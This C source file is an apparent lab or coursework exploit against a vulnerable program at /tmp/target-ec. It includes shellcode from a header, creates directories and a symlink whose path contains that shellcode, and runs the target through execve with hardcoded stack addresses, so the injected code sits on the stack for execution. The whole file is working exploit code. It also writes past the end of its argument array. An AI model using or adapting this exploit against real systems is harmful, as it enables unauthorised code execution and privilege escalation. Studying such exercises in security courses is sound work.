#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "sys/stat.h"
#include "shellcode.h"

#define TARGET "/tmp/target-ec"
#define DIR_SIZE 200

/**
 * Place shellcode on stack top as argument using symlink path
 * */

int main(void)
{
    char *args[3];
    char *env[1];

    char *slash1 = strstr(shellcode, "/");
    char *slash2 = strstr(slash1 + 1, "/");
    char *pathPrefix = "/tmp/";
    char path1[DIR_SIZE];
    char path2[DIR_SIZE];
    char path3[DIR_SIZE];
    memset(path1, 0, sizeof(path1));
    memcpy(path1, pathPrefix, strlen(pathPrefix));
    memcpy(path1 + strlen(pathPrefix), shellcode, slash1 - shellcode);
    path1[strlen(pathPrefix)+slash1-shellcode] = '\0';

    memset(path2, 0, sizeof(path3));
    memcpy(path2, pathPrefix, strlen(pathPrefix));
    memcpy(path2 + strlen(pathPrefix), shellcode, slash2 - shellcode);
    path2[strlen(pathPrefix)+slash2-shellcode] = '\0';

    memset(path3, ' ', sizeof(path3));
    memcpy(path3, pathPrefix, strlen(pathPrefix));
    memcpy(path3 + strlen(pathPrefix), shellcode, strlen(shellcode));
    path3[sizeof(path3)-1] = '\0';

    mkdir(path1, S_IRWXU | S_IRWXO);
    mkdir(path2, S_IRWXU | S_IRWXO);
    symlink(TARGET, path3);

    args[0] = TARGET;
    args[1] = "0xbffffd8c";
    args[2] = "0xbfffff39";
    args[3] = NULL;
    env[0] = NULL;

    if (0 > execve(path3, args, env))
        fprintf(stderr, "execve failed.\n");

    return 0;
}
